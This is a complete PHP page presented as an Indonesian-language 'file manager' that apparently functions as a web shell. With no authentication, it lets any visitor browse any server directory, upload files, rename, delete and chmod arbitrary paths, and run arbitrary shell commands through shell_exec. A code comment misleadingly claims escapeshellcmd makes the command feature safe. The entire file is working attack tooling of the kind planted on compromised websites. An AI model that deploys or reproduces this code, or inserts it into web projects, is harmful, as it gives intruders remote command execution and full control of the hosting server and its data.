<?php
// Fungsi untuk menghindari serangan XSS pada URL
function x($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

// Mendapatkan path direktori saat ini dari query parameter 'd' atau default menggunakan getcwd()
$currentPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();

// Memastikan path yang diterima adalah direktori yang valid
if (!is_dir($currentPath)) {
    die("Direktori tidak valid.");
}

// Menangani pengunggahan file
if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
    $uploadFile = $_FILES['uploaded_file'];
    $targetPath = rtrim($currentPath, '/') . '/' . basename($uploadFile['name']);
    
    // Memeriksa apakah file berhasil di-upload
    if ($uploadFile['error'] == UPLOAD_ERR_OK) {
        if (move_uploaded_file($uploadFile['tmp_name'], $targetPath)) {
            echo "File berhasil di-upload ke: " . htmlspecialchars($targetPath);
        } else {
            echo "Gagal memindahkan file ke direktori tujuan.";
        }
    } else {
        echo "Terjadi kesalahan saat mengupload file. Error code: " . $uploadFile['error'];
    }
}

// Menangani pembuatan folder
if (isset($_POST['create_folder'])) {
    $createPath = $_POST['create_path'];
    $folderName = $_POST['folder_name'];
    $newFolderPath = rtrim($createPath, '/') . '/' . $folderName;

    if (mkdir($newFolderPath)) {
        echo "Folder '$folderName' berhasil dibuat.";
    } else {
        echo "Gagal membuat folder.";
    }
}

// Menangani pengubahan nama file/folder
if (isset($_POST['rename'])) {
    $renamePath = $_POST['rename_path'];
    $newName = $_POST['new_name'];
    $newPath = rtrim(dirname($renamePath), '/') . '/' . $newName;

    if (rename($renamePath, $newPath)) {
        echo "File atau folder berhasil diubah namanya.";
    } else {
        echo "Gagal mengubah nama file/folder.";
    }
}

// Menangani perubahan permission
if (isset($_POST['change_perm'])) {
    $permPath = $_POST['perm_path'];
    $permissions = $_POST['permissions'];

    // Memastikan permission valid dan mengubah permission
    if (chmod($permPath, octdec($permissions))) {
        echo "Permission berhasil diubah.";
    } else {
        echo "Gagal mengubah permission.";
    }
}

// Menangani perintah terminal
if (isset($_POST['run_command'])) {
    $command = escapeshellcmd($_POST['command']); // Mengamankan perintah dari eksekusi berbahaya
    $output = shell_exec($command);
    if ($output === null) {
        echo "Perintah gagal dijalankan.";
    } else {
        echo "<pre>$output</pre>";
    }
}

// Menghapus file atau folder
if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];

    if (is_file($deletePath)) {
        if (unlink($deletePath)) {
            echo "File berhasil dihapus.";
        } else {
            echo "Gagal menghapus file.";
        }
    } elseif (is_dir($deletePath)) {
        if (rmdir($deletePath)) {
            echo "Folder berhasil dihapus.";
        } else {
            echo "Gagal menghapus folder.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pengelola Berkas</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Styling yang ada tetap sama */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        body {
            background: url('https://gcdnb.pbrd.co/images/9MsvMtxPndIa.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #container {
            padding: 20px;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            width: 100%;
            max-width: 100%;
            height: 100%;
            box-sizing: border-box;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
        }

        .icon-button {
            font-size: 20px;
            color: white;
            cursor: pointer;
            background-color: darkred;
            border-radius: 50%;
            padding: 8px;
            margin: 2px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        table, th, td {
            border: 1px solid white;
        }

        th, td {
            padding: 10px;
            text-align: left;
        }

        th {
            background-color: darkred;
        }

        .form-container {
            display: none;
            margin-top: 10px;
        }

        .submit-button {
            background-color: darkred;
            border: none;
            color: white;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
        }

        img {
            display: block;
            margin: 0 auto 20px; 
            width: 150px;
            height: 150px;
            border-radius: 50%;
            border: 2px solid darkred;
            object-fit: cover;
        }

        .breadcrumb a {
            color: white;
            text-decoration: none;
            padding: 5px;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        /* Responsif untuk perangkat kecil */
        @media (max-width: 768px) {
            #container {
                padding: 10px;
            }
            .icon-button {
                font-size: 18px;
                padding: 6px;
                margin: 5px;
            }
            img {
                width: 120px;
                height: 120px;
            }
            table, th, td {
                font-size: 12px;
                padding: 8px;
            }
            .breadcrumb {
                font-size: 14px;
            }
        }

        /* Responsif untuk layar lebih kecil (mobile) */
        @media (max-width: 480px) {
            #container {
                padding: 5px;
            }
            .icon-button {
                font-size: 16px;
                padding: 5px;
                margin: 4px;
            }
            img {
                width: 100px;
                height: 100px;
            }
            table, th, td {
                font-size: 10px;
                padding: 6px;
            }
            .breadcrumb {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div id="container">
        <img src="https://media.tenor.com/TcwzV1IM0EcAAAAi/zero-two-ok.gif" alt="Logo">
        <b>Pengelola Berkas</b><br />

        <!-- Menampilkan direktori saat ini -->
        <div class="breadcrumb">
            <?php
            $directories = explode(DIRECTORY_SEPARATOR, $currentPath);
            $currentPath = '';
            foreach ($directories as $index => $dir) {
                if ($index == 0) {
                    echo '<a href="?d=' . urlencode($dir) . '">' . htmlspecialchars($dir) . '</a>';
                } else {
                    $currentPath .= DIRECTORY_SEPARATOR . $dir;
                    echo ' / <a href="?d=' . urlencode($currentPath) . '">' . htmlspecialchars($dir) . '</a>';
                }
            }
            ?>
        </div>

        <center>
            <i class="fas fa-upload icon-button" onclick="toggleForm('upload-form')"></i>
            <i class="fas fa-folder-plus icon-button" onclick="toggleForm('create-folder-form')"></i>
            <i class="fas fa-terminal icon-button" onclick="toggleForm('run-command-form')"></i>
        </center>

        <div id="upload-form" class="form-container">
            <form method="POST" action="" enctype="multipart/form-data">
                <input type="hidden" name="upload_path" value="<?php echo htmlspecialchars($currentPath); ?>" />
                <input type="file" name="uploaded_file" />
                <button type="submit" name="upload" class="submit-button"><i class="fas fa-upload"></i> Unggah</button>
            </form>
        </div>

        <div id="create-folder-form" class="form-container">
            <form method="POST" action="">
                <input type="hidden" name="create_path" value="<?php echo htmlspecialchars($currentPath); ?>" />
                <input type="text" name="folder_name" placeholder="Nama Folder" />
                <button type="submit" name="create_folder" class="submit-button"><i class="fas fa-folder-plus"></i> Buat Folder</button>
            </form>
        </div>

        <div id="run-command-form" class="form-container">
            <form method="POST" action="">
                <input type="text" name="command" placeholder="Masukkan perintah terminal" />
                <button type="submit" name="run_command" class="submit-button"><i class="fas fa-terminal"></i> Perintah</button>
            </form>
        </div>

        <table>
            <tr>
                <th>Nama</th>
                <th>Permission</th>
                <th>Size</th>
                <th>Aksi</th>
            </tr>
            <?php
            if (is_dir($currentPath)) {
                foreach (scandir($currentPath) as $data) {
                    if ($data !== '.' && $data !== '..') {
                        $fullPath = rtrim($currentPath, '/') . '/' . $data;
                        $permissions = substr(sprintf('%o', fileperms($fullPath)), -4);

                        // Menentukan ukuran file atau folder
                        $size = is_dir($fullPath) ? 'Folder' : formatSize(filesize($fullPath));

                        echo "<tr>\n";
                        echo "<td><a href='?d=" . urlencode($fullPath) . "'>$data</a></td>\n";
                        echo "<td>$permissions</td>\n";
                        echo "<td>$size</td>\n";
                        echo "<td>\n";
                        echo "<i class='fas fa-edit icon-button' onclick=\"toggleForm('rename-form-$data')\"></i>\n";
                        echo "<i class='fas fa-key icon-button' onclick=\"toggleForm('perm-form-$data')\"></i>\n";
                        echo "<i class='fas fa-trash icon-button' onclick=\"confirmDelete('$fullPath')\"></i>\n"; // Tombol hapus
                        echo "</td>\n";
                        echo "</tr>\n";

                        // Formulir untuk mengubah nama
                        echo "<tr id='rename-form-$data' class='form-container'>\n";
                        echo "<td colspan='4'>\n";
                        echo "<form method='POST' action=''>\n";
                        echo "<input type='hidden' name='rename_path' value='" . htmlspecialchars($fullPath) . "'>\n";
                        echo "<input type='text' name='new_name' placeholder='Ubah nama'>\n";
                        echo "<button type='submit' name='rename' class='submit-button'><i class='fas fa-edit'></i> Ubah Nama</button>\n";
                        echo "</form>\n";
                        echo "</td>\n";
                        echo "</tr>\n";

                        // Formulir untuk mengubah izin
                        echo "<tr id='perm-form-$data' class='form-container'>\n";
                        echo "<td colspan='4'>\n";
                        echo "<form method='POST' action=''>\n";
                        echo "<input type='hidden' name='perm_path' value='" . htmlspecialchars($fullPath) . "'>\n";
                        echo "<input type='text' name='permissions' placeholder='Izin (e.g., 0755)'>\n";
                        echo "<button type='submit' name='change_perm' class='submit-button'><i class='fas fa-key'></i> Ubah Izin</button>\n";
                        echo "</form>\n";
                        echo "</td>\n";
                        echo "</tr>\n";
                    }
                }
            }

            // Fungsi untuk format ukuran file
            function formatSize($bytes) {
                if ($bytes >= 1073741824) {
                    return number_format($bytes / 1073741824, 2) . ' GB';
                } elseif ($bytes >= 1048576) {
                    return number_format($bytes / 1048576, 2) . ' MB';
                } elseif ($bytes >= 1024) {
                    return number_format($bytes / 1024, 2) . ' KB';
                } else {
                    return $bytes . ' B';
                }
            }
            ?>
        </table>
    </div>

    <script>
    function toggleForm(formId) {
        var forms = document.querySelectorAll('.form-container');
        forms.forEach(function(form) {
            form.style.display = 'none';
        });

        var form = document.getElementById(formId);
        if (form) {
            form.style.display = (form.style.display === 'block') ? 'none' : 'block';
        }
    }

    function confirmDelete(path) {
        if (confirm('Apakah Anda yakin ingin menghapus ' + path + '?')) {
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '';

            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'delete_path';
            input.value = path;
            form.appendChild(input);

            document.body.appendChild(form);
            form.submit();
        }
    }
    </script>
</body>
</html>
